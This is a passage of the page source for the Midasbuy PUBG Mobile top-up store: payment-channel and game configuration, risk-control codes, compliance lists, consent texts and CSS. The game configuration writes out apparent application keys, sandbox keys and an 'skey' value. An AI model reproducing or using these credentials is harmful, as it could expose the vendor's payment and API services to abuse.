                        "subchannel": "card"
                    },
                    "pm": "os_boacompra"
                },
                "os_boacompra_cash": {
                    "channel": "boacompra",
                    "currencyType": ["BRL", "MXN", "TRY", "USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "imgs": [{
                        "br": ["https://midas.gtimg.cn/boacompra/cash/boleto.png"],
                        "mx": ["https://midas.gtimg.cn/store_config/1599469782213uvTvpgio.png", "https://midas.gtimg.cn/store_config/1599469829601bNmlIQU.png", "https://midas.gtimg.cn/store_config/1599469846005mxPrxulJ.png"]
                    }],
                    "name": "Cash",
                    "payParams": {
                        "channel": "boacompra",
                        "payment_group": "cash",
                        "subchannel": "cash"
                    },
                    "pm": "os_boacompra"
                },
                "os_boacompra_transfer": {
                    "channel": "boacompra",
                    "currencyType": ["BRL", "MXN", "TRY", "USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "imgs": ["https://midas.gtimg.cn/boacompra/bank_transfer/bancodobrasil.png", "https://midas.gtimg.cn/boacompra/bank_transfer/itau.png", "https://midas.gtimg.cn/boacompra/bank_transfer/banrisul.png", "https://midas.gtimg.cn/boacompra/bank_transfer/santander.png", "https://midas.gtimg.cn/boacompra/bank_transfer/bradesco.png", "https://midas.gtimg.cn/boacompra/bank_transfer/caixa.png", {
                        "br": ["https://midas.gtimg.cn/store_config/1599470452089hr67AhtV.png", "https://midas.gtimg.cn/store_config/1599470491830w6ybRbBL.png", "https://midas.gtimg.cn/store_config/1599470517784l4C7bG3R.png", "https://midas.gtimg.cn/store_config/1599470538002ErB0xqb3.png"],
                        "mx": ["https://midas.gtimg.cn/store_config/1599470891891WVjmmVZv.png", "https://midas.gtimg.cn/store_config/1599470910934LpErPYzr.jpg", "https://midas.gtimg.cn/store_config/1599470959778qwiV6VWR.png", "https://midas.gtimg.cn/store_config/1599470985697qvSbBE7g.jpg", "https://midas.gtimg.cn/store_config/1599471060834hyELBEj.jpg", "https://midas.gtimg.cn/store_config/1599471079298iOYylAlq.png", "https://midas.gtimg.cn/store_config/1599471095318MZm94mDE.png"],
                        "tr": ["https://midas.gtimg.cn/boacompra/bank_transfer/isbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/granti.png", "https://midas.gtimg.cn/boacompra/bank_transfer/akbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/yapikredi.png", "https://midas.gtimg.cn/boacompra/bank_transfer/denizbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/ptt.png", "https://midas.gtimg.cn/boacompra/bank_transfer/kuveytturk.png", "https://midas.gtimg.cn/boacompra/bank_transfer/vakifbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/ziraatbankasi.png", "https://midas.gtimg.cn/boacompra/bank_transfer/teconomibank.png"]
                    }],
                    "name": "Transfer",
                    "payParams": {
                        "channel": "boacompra",
                        "payment_group": "transfer",
                        "subchannel": "transfer"
                    },
                    "pm": "os_boacompra"
                },
                "os_boacompra_wallet": {
                    "channel": "boacompra",
                    "currencyType": ["BRL", "MXN", "TRY", "USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "imgs": ["https://midas.gtimg.cn/boacompra/online_wallet/gold.png", "https://midas.gtimg.cn/boacompra/online_wallet/pagseguro.png", "https://midas.gtimg.cn/boacompra/online_wallet/paypal.png", {
                        "br": ["https://midas.gtimg.cn/store_config/1599471567752tfaaKPWp.png", "https://midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"],
                        "mx": ["https://midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"]
                    }],
                    "name": "Wallet",
                    "payParams": {
                        "channel": "boacompra",
                        "payment_group": "online wallet",
                        "subchannel": "wallet"
                    },
                    "pm": "os_boacompra"
                },
                "os_paypal": {
                    "currencyType": ["AUD", "BRL", "CAD", "CZK", "DKK", "EUR", "HKD", "HUF", "INR", "ILS", "JPY", "MYR", "MXN", "TWD", "NZD", "NOK", "PHP", "PLN", "GBP", "RUB", "SGD", "SEK", "CHF", "THB", "USD"],
                    "icon_h5": "https://midas.gtimg.cn/overseaspay/images/public/logo_paypal.png",
                    "icon_pc": "https://midas.gtimg.cn/overseaspay/images/public/logo_paypal.png",
                    "name": "PayPal",
                    "payParams": {
                        "channel": "paypal_new",
                        "newtab": 1
                    },
                    "pm": "os_paypal"
                },
                "os_skrill": {
                    "currencyType": ["EUR", "USD", "GBP", "SEK", "AED", "SAR", "KWD", "RUB", "TRY"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_skrill-h542ac8ffc.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_skrill-h542ac8ffc.png",
                    "name": "Skrill",
                    "payParams": {
                        "channel": "skrill",
                        "isv3": 1,
                        "newtab": 1
                    },
                    "pm": "os_skrill"
                },
                "paypal": {
                    "currencyType": ["USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/paypal5088bda5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/paypal5088bda5.png",
                    "name": "Paypal",
                    "pm": "paypal:1"
                },
                "wechat": {
                    "H5_frameHeight": "200",
                    "channel": "",
                    "cssObj": {
                        "height": 200,
                        "width": 200
                    },
                    "currencyType": ["CNY", "HKD", "USD"],
                    "icon_h5": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
                    "icon_pc": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
                    "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
                    "isWechat": 1,
                    "name": "微信支付",
                    "payParams": {
                        "channel": "wechat",
                        "h5_newtab": 0,
                        "pc_newtab": 0,
                        "subchannel": ""
                    },
                    "pm": "wechat",
                    "supportJsApi": 1
                },
                "os_credit_card": {
                    "channel": "creditcard",
                    "currencyType": ["SEK", "EUR", "PLN", "THB", "EGP", "MMK", "INR", "HKD", "BRL", "IDR", "USD", "PKR", "LAK", "TWD", "TRY", "IQD", "PHP", "MYR", "SGD", "MMK", "EGP", "INR", "HKD", "ILS", "SGD", "SAR", "AED", "KWD", "AUD", "RUB", "CHF", "GBP", "EUR", "QAR", "BHD", "MXN", "ZAR", "CLP", "OMR", "LKR", "KZT", "NZD"],
                    "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/card_icon.png",
                    "icon_pc": "https://midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png",
                    "icon_pc_2": "https://midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png",
                    "imgs": ["https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_visa.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_master.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_amex.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_unionpay.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_diners.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_discover.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_jcb.png", {
                        "fr": ["https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_visa.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_master.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_amex.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_unionpay.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_diners.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_discover.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_jcb.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_cb.png"],
                        "tr": ["https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_visa.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_master.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_amex.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_unionpay.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_diners.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_discover.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_jcb.png", "https://cdn.midasbuy.com/h5/overseah5/images/card_icon_v2_troy.png"]
                    }],
                    "name": "Credit / Debit / Prepaid Card",
                    "payParams": {
                        "action": "pay",
                        "needAvs": false,
                        "need_translate_keys": ["cgi_extend", "drm_info"],
                        "query_drm": 1,
                        "theme": "normal",
                        "use_json": "1"
                    },
                    "pm": "os_credit_card:1"
                },
                "codapay_kh_pipay": {
                    "channel": "codapay",
                    "currencyType": ["USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/Pi-Paya6a8bb3c.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/Pi-Paya6a8bb3c.png",
                    "name": "Pi Pay",
                    "pm": "os_codapay:48",
                    "subchannel": "pipay"
                },
                "mol_paysafecard": {
                    "channel": "mol_global",
                    "currencyType": ["MXN", "USD", "CAD"],
                    "icon_h5": "",
                    "icon_pc": "https://cdn.midasbuy.com/images/2104x2104_107_meitu_122f24ecd9.png",
                    "icon_pc_2": "https://cdn.midasbuy.com/images/2104x2104_107_meitu_122f24ecd9.png",
                    "name": "Paysafecard",
                    "pm": "mol:107",
                    "subchannel": "mol_paysafecard"
                },
                "os_redeem_code": {
                    "currencyType": ["*"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_redeem_codef338c51c.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_redeem_codef338c51c.png",
                    "name": "Redeem Code",
                    "pm": "os_redeem_code"
                }
            };
            var CHANNEL_FILTER = {
                "os_credit_card": {
                    "midasbuy-hk-pubgm": "1"
                },
                "os_upoint": {
                    "[a-z]{2,10}-[a-z]{2,10}-[a-z]{2,10}": "0.8"
                }
            };
            var GAME_CONFIG = {
                "AMSInitConfig": {
                    "initParams": {
                        "sAMSAppId": "IEG-AMS-11576",
                        "sAMSVersion": "2.0",
                        "sCloudApiName": "ams.gameattr.sidip",
                        "sServiceType": "pubgmobile"
                    },
                    "url": "https://mrms.igamecj.com/main/do"
                },
                "allowCountry": ["ps", "ot", "id", "th", "ph", "my", "mm", "kh", "la", "hk", "sg", "ru", "tr", "gr", "ua", "br", "eg", "sa", "kw", "qa", "ae", "iq", "dz", "bh", "ly", "ma", "se", "nl", "om", "tn", "za", "pk", "bd", "pl", "au", "gb", "fr", "it", "de", "ch", "es", "mx", "lk", "kz", "nz", "fi", "no", "dk", "cl", "at"],
                "appKey": "iAB7crB9faSd9TPNgCsSlhbltWaY8z8P",
                "appid": "1450015065",
                "appkey": "iAB7crB9faSd9TPNgCsSlhbltWaY8z8P",
                "appkey_sandbox": "ElJpeCnJuZHsXnf9rTqerPuPTxJG4vin",
                "basicCardPid": "20210714_RP_Upgrade_Card_Package",
                "cacheCharac": false,
                "drm_group_map": {
                    "GOODS201230150621400": {
                        "buyType": "bg",
                        "country": ["hk", "my", "th"],
                        "end": "2021-12-30 12:00:00"
                    },
                    "IN_BD": {
                        "country": ["in", "bd", "pk"],
                        "end": "2020-02-16 23:59:59"
                    },
                    "mena_invite": {
                        "country": ["iq", "eg"],
                        "end": "2020-01-20 23:59:59"
                    },
                    "sea_invite": {
                        "country": ["id", "my", "th", "mm", "sg", "la", "ph", "kh", "hk"],
                        "end": "2020-02-16 23:59:59"
                    },
                    "tr_limit": {
                        "country": ["tr1"],
                        "end": "2020-11-26 15:59:59",
                        "start": "2019-09-27 00:00:00"
                    }
                },
                "drm_info": {
                    "groupid": "check_in",
                    "area": "Other",
                    "country": "OT",
                    "version": "3.0",
                    "midasbuyArea": "Other"
                },
                "fb_tdk": {
                    "group1": {
                        "countrys": ["id", "my", "th", "mm", "sg", "la", "ph", "kh"],
                        "fb_desc": "Invite friends to make a purchase on Midasbuy  and Both of you will be rewarded!",
                        "fb_image": "https://cdn.midasbuy.com/events/invite/pubgm/group1/images/invite_500_300.png",
                        "fb_sitename": "MidasBuy Top-Up Center",
                        "fb_title": "Rebate Fever of PUBG Mobile !",
                        "pop_ad_image_path": "https://midas.gtimg.cn/oversea_web/static/events/invite/pubgm/images"
                    },
                    "group2": {
                        "countrys": ["in"],
                        "fb_desc": "Invite friends to make a purchase on Midasbuy  and Both of you will be rewarded!",
                        "fb_image": "https://cdn.midasbuy.com/events/invite/pubgm/group2/images/invite_500_300.png",
                        "fb_sitename": "MidasBuy Top-Up Center",
                        "fb_title": "Rebate Fever of PUBG Mobile !",
                        "pop_ad_image_path": "https://cdn.midasbuy.com/events/invite/pubgm/group2/images"
                    },
                    "group3": {
                        "countrys": ["br"],
                        "fb_desc": "Invite friends to make a purchase on Midasbuy  and Both of you will be rewarded!",
                        "fb_image": "https://cdn.midasbuy.com/events/invite/pubgm/group5/images/invite_500_300.jpg",
                        "fb_sitename": "MidasBuy Top-Up Center",
                        "fb_title": "Rebate Fever of PUBG Mobile !",
                        "pop_ad_image_path": "https://cdn.midasbuy.com/events/invite/pubgm/group5/images"
                    }
                },
                "fbappid": "",
                "gameId": "1320",
                "gameShortUrl": "pubgm",
                "homepageSocialConfig": {
                    "image": "https://cdn.midasbuy.com/oversea_web/static/images/keep-in-touch-pic.jpg"
                },
                "images": {
                    "contract_ad_image": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-icon.png",
                    "contract_fail": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-fail-icon.png",
                    "contract_loading": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/save-card-loading-dian.png",
                    "contract_success": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-suc-icon.png",
                    "currency": "https://cdn.midasbuy.com/images/item-179be42ef.png",
                    "currencyIcon": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
                    "currencyIconInShop": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
                    "currencyIconMap": [{
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546007887MVeNUtB6.png",
                        "max": "299"
                    }, {
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546030876PIvqwGaa.png",
                        "max": "599",
                        "min": "300"
                    }, {
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546041426W8hmErMS.png",
                        "max": "1499",
                        "min": "600"
                    }, {
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546052747L5gSu7VB.png",
                        "max": "2999",
                        "min": "1500"
                    }, {
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546061912PLgMlY23.png",
                        "max": "5999",
                        "min": "3000"
                    }, {
                        "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546071746KqkIhrzG.png",
                        "min": "6000"
                    }],
                    "currencySmallIcon": "https://cdn.midasbuy.com/images/apps/pubgm/24_24d2c7b78c.png",
                    "download": "https://cdn.midasbuy.com/images/gamedownload6d44292c.png",
                    "gameLogo": "https://cdn.midasbuy.com/images/apps/pubgm/PUBGM_LOGO.png",
                    "guideImg": {
                        "p01": "https://cdn.midasbuy.com/images/apps/pubgm/guide001.png",
                        "p02": "https://cdn.midasbuy.com/images/apps/pubgm/guide002.png",
                        "p03": ""
                    },
                    "indexPageImg": "https://cdn.midasbuy.com/images/%E5%8D%A1%E7%89%87cf6f35c4.png",
                    "item": "https://cdn.midasbuy.com/images/%E7%B2%BE%E8%8B%B1%E5%8D%A1%20_%EF%BC%88128x128%EF%BC%89-1d8036e20.png",
                    "promotions": "https://cdn.midasbuy.com/images/%E7%A9%BA%E6%8A%95%E7%AE%B1fca9cbf0.png",
                    "redeem": "https://cdn.midasbuy.com/images/item-25a68966f.png",
                    "resellerImg": {
                        "tr": "https://cdn.midasbuy.com/images/apps/pubgm/1596080058217RiIQzc9r.png"
                    },
                    "resultBgImg": "https://cdn.midasbuy.com/images/apps/pubgm/PUBGM_bachground.png",
                    "subscribe": ""
                },
                "indexPage": {
                    "default": "homepage"
                },
                "invited_country": ["id", "my", "th", "mm", "sg", "la", "ph", "kh", "ot", "br", "in"],
                "isGame": 1,
                "isHot": 1,
                "isPubg": 1,
                "jifen_appkey": "BeXQExMrfxM4qcbeCEPeuNeVRPjJtRIZ",
                "jifen_appkey_sandbox": "VkCZ9gD1Bb78Ffj1UDhQwGvgGeNpykSx",
                "links": {
                    "downloadlink": "",
                    "facebookLink": "",
                    "feedback": "",
                    "gamelogoLink": "",
                    "officialwebsite": "",
                    "privacystatement": "",
                    "supplementaryTerms": "",
                    "termofservice": ""
                },
                "msdkUrl": "http://srvapi.itop.qq.com:6516/v1.0/user/getOpenidByBusiness",
                "name": "PUBG_全球版",
                "needActiveData": 1,
                "noShowPriceProductIdArray": ["Weekly_special_gift_package", "Wild_Ambition_package"],
                "offerid_jifen": "1450018035",
                "pf": "xxx-v2-android-midasweb",
                "pf_jifen": "xxx-v2-android-midasweb",
                "plusCardPid": "20210714_Elite_Pass_Plus_Package",
                "previewCountry": [],
                "productNotInShop": ["Enraged_Unicorn_cover", "Enraged_Unicorn_Set", "Lobster_Set", "Lobster_Cover", "Adorable_Panda_Suit", "Summer_Festival_Bandana", "Summer_Festival_Set", "Forest_Warrior_Set", "Ski_Patrol_Set", "Goth_Punk_Set", "Seeing_Red_Set", "Red_Menace_Outfit", "Lethal_Butterflies_Set", "Cobalt_Storm_Backpack", "Desert_Range_Set", "Scarlet_Beast_Parachute", "Yeti_Pan", "Yeti_Parachute", "Bling_Glasses", "Ice_Hockey_Crowbar", "Desert_Troops_Mask", "Desert_Troops_Baseball_Cap", "Barmaid_Top", "Barmaid_Skirt", "Psycho_Jester_Top", "Psycho_Jester_Pants", "Psycho_Jester_Boots", "Elite_Operative_Sunglasses", "15DAYS_Jungle_M416", "30DAYS_Neon_Destroyer_AUG", "30DAYS_Lightning_AWM", "30DAYS_PCircus_M249", "30DAYS_The_Skulls_UMP45", "30DAYS_Neon_Destroyer_M16A4", "30DAYS_Drifte_UZI", "15DAYS_Tidal_Wave_SCAR_L", "30DAYS_White_Rabbit_P18C", "30DAYS_Space_Travel_S686", "30DAYS_Neon_AWM", "Corn_Suit", "Corn_Cover"],
                "redeemTip": {
                    "in": "3. By clicking “OK”, you agree to be bound by <a target=\"blank\" href=\"//www.pubgmobile.com/gamecredits/terms.html\">“PUBG Mobile Game Credit Cards (India)-Terms and Condition.”</a>"
                },
                "redeemlogin": "*",
                "risk_control_error_code_array": {
                    "area_block_err_code": ["12217", "12200", "12201", "12202", "12204", "12186", "12200", "12201", "12202", "12204"],
                    "only_tips_block_err_code": ["12184"],
                    "pay_too_frequent_err_code": ["12168", "12209", "12162", "12164"]
                },
                "seasonBasicCardPid": "20210714_RP_Upgrade_Card_Package",
                "seasonCardPid": ["20210714_RP_Upgrade_Card_Package", "20210714_Elite_Pass_Plus_Package"],
                "seasonCardStartTime": "2020-01-10-02-00-00",
                "seasonPlusCardPid": "20210714_Elite_Pass_Plus_Package",
                "sellCurrency": ["ps", "fi", "ot", "id", "th", "ph", "my", "mm", "kh", "la", "hk", "sg", "tw", "in", "ru", "tr", "br", "eg", "sa", "kw", "qa", "ae", "iq", "dz", "bh", "ma", "se", "ua", "gr", "nl", "om", "tn", "za", "pk", "bd", "pl", "ly", "au", "kz", "mx", "lk", "gb", "nz", "fr", "de", "it", "es", "ch", "no", "dk", "cl", "at"],
                "sellGoods": ["ot", "kz", "id", "hk", "kh", "au", "pk", "ph", "mm", "my", "la", "sg", "lk", "th", "tw", "eg", "bh", "bd", "om", "kw", "iq", "ae", "sa", "qa", "fi", "no", "nl", "pl", "ru", "ch", "se", "tr", "gb", "br", "dk", "de", "mx", "fr", "it"],
                "sellRedeem": ["ot", "id", "ph", "in", "tr", "sa", "kw", "qa", "ae", "iq", "dz", "bh", "ly", "ma", "om", "kh", "tn", "th", "za", "my", "tw", "hk", "mm", "my", "sg", "th", "pk", "bd", "la"],
                "short_openid_rule": "^[1-9]\\d+$",
                "short_openid_type": "idip",
                "showPromotions": "*",
                "skey": "7f4b0c0e0c95d89636a71b2afeefd39a",
                "status": 1,
                "supplementaryTermsCountryList": ["GB", "UK", "DE", "FR", "ES", "IT", "CH", "SE", "NZ", "PL", "DK", "NO", "FI", "GR", "PT", "AT"],
                "template": "v2",
                "titleName": "PUBG Mobile",
                "type": "save",
                "zoneid": "1",
                "zoneid_jifen": "1",
                "zoneid_partition_map": {
                    "1": {
                        "area": "1",
                        "partition": "1",
                        "platid": "1"
                    }
                }
            };
            window.risk_control_error_code_array = {
                "area_block_err_code": ["12217", "12200", "12201", "12202", "12204", "12186", "12200", "12201", "12202", "12204"],
                "only_tips_block_err_code": ["12184"],
                "pay_too_frequent_err_code": ["12168", "12209", "12162", "12164"]
            };
            window.noComplianceCountryList = ["VN", "VNG"];
            window.complianceWithBirthCountryList = ["AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR", "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL", "PL", "PT", "RO", "SK", "SI", "ES", "SE", "GB", "IS", "LI", "NO", "CH", "IN", "KR", "RU", "TR", "US", "OT"];
            window.complianceWithDataCountryList = ["AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR", "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL", "PL", "PT", "RO", "SK", "SI", "ES", "SE", "GB", "IS", "LI", "NO", "CH", "OT"];
            window.buylimits = {
                "group1": {
                    "country": ["in", "tr"],
                    "minage": 18
                },
                "group2": {
                    "country": "*",
                    "minage": 18
                }
            };
            window.needActiveData = 1;
            window.defaultShowNum = 16;
            window.showRedeemChannel = 'false' === 'true';;
            window.needSupplementaryTerms = 'false' === 'true';
            window.agreementArray = ["By ticking this box, you confirm that you have read and agreed to the Midasbuy <a data-link='termsOfServicesLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.", "By ticking this box, you confirm that you have read and agreed to the Midasbuy <a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.", "By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.", " By ticking this box, you confirm that you have read and agreed to the <a data-link=\"pubgmSupplementaryTermsLink\" target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a> and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.", "You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced.", "By ticking this box, you confirm that you agree to the Midasbuy <a data-link='termsOfServicesLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a>、<a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a> and <a data-link=\"pubgmSupplementaryTermsLink\" target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a>."];
            window.reglimits = {
                "group1": {
                    "country": ["in", "tr"],
                    "minage": 18
                },
                "group2": {
                    "country": "*",
                    "minage": 18
                }
            };
            window.channelRestore = {
                "default": {
                    "helpBtn": "OK",
                    "helpDesc": "The payment channel system is under maintenance, please choose another payment method",
                    "helpTitle": "Announcement"
                }
            };
            window.images = {
                "contract_ad_image": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-icon.png",
                "contract_fail": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-fail-icon.png",
                "contract_loading": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/save-card-loading-dian.png",
                "contract_success": "https://cdn.midasbuy.com/oversea_web/static/images/creditCard/card-suc-icon.png",
                "currency": "https://cdn.midasbuy.com/images/item-179be42ef.png",
                "currencyIcon": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
                "currencyIconInShop": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
                "currencyIconMap": [{
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546007887MVeNUtB6.png",
                    "max": "299"
                }, {
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546030876PIvqwGaa.png",
                    "max": "599",
                    "min": "300"
                }, {
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546041426W8hmErMS.png",
                    "max": "1499",
                    "min": "600"
                }, {
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546052747L5gSu7VB.png",
                    "max": "2999",
                    "min": "1500"
                }, {
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546061912PLgMlY23.png",
                    "max": "5999",
                    "min": "3000"
                }, {
                    "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546071746KqkIhrzG.png",
                    "min": "6000"
                }],
                "currencySmallIcon": "https://cdn.midasbuy.com/images/apps/pubgm/24_24d2c7b78c.png",
                "download": "https://cdn.midasbuy.com/images/gamedownload6d44292c.png",
                "gameLogo": "https://cdn.midasbuy.com/images/apps/pubgm/PUBGM_LOGO.png",
                "guideImg": {
                    "p01": "https://cdn.midasbuy.com/images/apps/pubgm/guide001.png",
                    "p02": "https://cdn.midasbuy.com/images/apps/pubgm/guide002.png",
                    "p03": ""
                },
                "indexPageImg": "https://cdn.midasbuy.com/images/%E5%8D%A1%E7%89%87cf6f35c4.png",
                "item": "https://cdn.midasbuy.com/images/%E7%B2%BE%E8%8B%B1%E5%8D%A1%20_%EF%BC%88128x128%EF%BC%89-1d8036e20.png",
                "promotions": "https://cdn.midasbuy.com/images/%E7%A9%BA%E6%8A%95%E7%AE%B1fca9cbf0.png",
                "redeem": "https://cdn.midasbuy.com/images/item-25a68966f.png",
                "resellerImg": {
                    "tr": "https://cdn.midasbuy.com/images/apps/pubgm/1596080058217RiIQzc9r.png"
                },
                "resultBgImg": "https://cdn.midasbuy.com/images/apps/pubgm/PUBGM_bachground.png",
                "subscribe": ""
            };
            window.pfLimit = "";
        </script>
        <style>
            .fade-enter-active,
            .fade-leave-active {
                transition: opacity .5s;
            }

            .fade-enter,
            .fade-leave-to {
                opacity: 0;
            }

            /* 使用vue 的 transition 需要用到 v-show 所以就将display:none 覆盖 使用v-show来控制 */
            .pay-type-box .choose-pay-box {
                display: block;
            }

            /* mobile使用淡出效果 */
            @media screen and (max-width: 768px) {

                .fade-select-enter-to,
                .fade-select-leave {
                    opacity: 1;
                }

                .fade-select-enter-active,
                .fade-select-leave-active {
                    transition: opacity .5s;
                }

                .fade-select-enter,
                .fade-select-leave-to

                /* .fade-leave-active below version 2.1.8 */
                    {
                    opacity: 0;
                }
            }

            /* pc使用slide toggle效果 */
            @media screen and (min-width: 769px) {

                .fade-select-enter-to,
                .fade-select-leave {
                    /* 这个高度需要注意跟重构那边同步 */
                    max-height: 184px;
                    overflow: hidden;
                }

                .fade-select-enter-active,
                .fade-select-leave-active {
                    transition: max-height .5s;
                }

                .fade-select-enter,
                .fade-select-leave-to

                /* .fade-leave-active below version 2.1.8 */
                    {
                    max-height: 0;
                    overflow: hidden;
                }
            }

            .toast-bg {
                z-index: 999999998;
                position: fixed;
                left: 0;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                opacity: 0.8;
                background: #131A3C;
            }
        </style>
        <div id="app" style="display: block">
            <nav-header :header-box="false"></nav-header>



            <div class="banner-wrap">


                <div id="swiper" class="swiper-container" style="height: auto;overflow: visible;">
                    <div class="swiper-wrapper swiper-wrapper1" id="swiper-wrapper">


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/banner11bbf2c920.png) no-repeat center;background-size: cover;">
                    <a class="banner-link" href="https://www.midasbuy.com/midasbuy/id/shop/pubgm?from=__mds_buy_banner.topup">
                        <div class="img-box">
                            <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://cdn.midasbuy.com/images/banner11bbf2c920.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        

                    </div>
